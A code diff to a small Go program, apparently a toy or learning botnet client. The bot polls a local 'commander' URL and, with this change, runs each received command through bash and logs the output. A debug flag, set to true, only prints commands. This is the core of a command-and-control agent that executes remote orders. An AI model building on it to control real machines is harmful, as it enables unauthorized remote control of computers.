@@ -1,10 +1,12 @@
 package main
 
 import (
+	"bytes"
 	"encoding/json"
 	"io/ioutil"
 	"log"
 	"net/http"
+	"os/exec"
 	"time"
 )
 
@@ -17,7 +19,9 @@ type Command struct {
 
 var commander_url = "http://127.1:3000/command"
 var bot_name = "testbot"
+var spawnedShell = "bash"
 var pollInterval uint32 = 10
+var debug = true //commands are not executed, only printed
 
 func pollCommand() (Command, error) {
 	resp, err := http.Get(commander_url)
@@ -39,6 +43,16 @@ func pollCommand() (Command, error) {
 	return command, nil
 }
 
+func shellexec(command string) (string, string, error) {
+    var stdout bytes.Buffer
+    var stderr bytes.Buffer
+    cmd := exec.Command(spawnedShell, "-c", command)
+    cmd.Stdout = &stdout
+    cmd.Stderr = &stderr
+    err := cmd.Run()
+    return stdout.String(), stderr.String(), err
+}
+
 func execute() error {
 	command, err := pollCommand()
 	if err != nil {
@@ -46,7 +60,16 @@ func execute() error {
 		return err
 	}
 	
-	log.Println(command.Cmd)
+	if debug {
+		log.Printf("Command: %s\n", command.Cmd)
+		return nil
+	}
+
+	stdout, stderr, err := shellexec(command.Cmd)
+	log.Printf("Command: %s\n", command.Cmd)
+	log.Printf("Stdout: %s\n", stdout)
+	log.Printf("Stderr: %s\n", stderr)
+
 	return nil
 }
 
